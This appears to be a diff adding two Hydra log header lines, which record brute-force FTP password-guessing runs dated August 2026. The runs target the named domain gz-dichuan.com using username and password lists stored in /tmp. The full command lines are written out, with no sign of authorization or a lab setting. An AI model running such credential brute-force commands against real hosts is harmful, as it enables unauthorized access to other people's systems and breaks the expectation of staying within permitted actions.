@@ -1,0 +1,2 @@
+# Hydra v9.2 run at 2026-08-05 04:37:08 on gz-dichuan.com ftp (hydra -L /tmp/users.txt -P /tmp/pw.txt -t 4 -W 5 -f -o /tmp/hydra_ftp_gz.txt ftp://gz-dichuan.com)
+# Hydra v9.2 run at 2026-08-05 04:40:28 on gz-dichuan.com ftp (hydra -L /tmp/users.txt -P /tmp/pw.txt -t 3 -W 8 -f -o /tmp/hydra_ftp_gz.txt ftp://gz-dichuan.com)
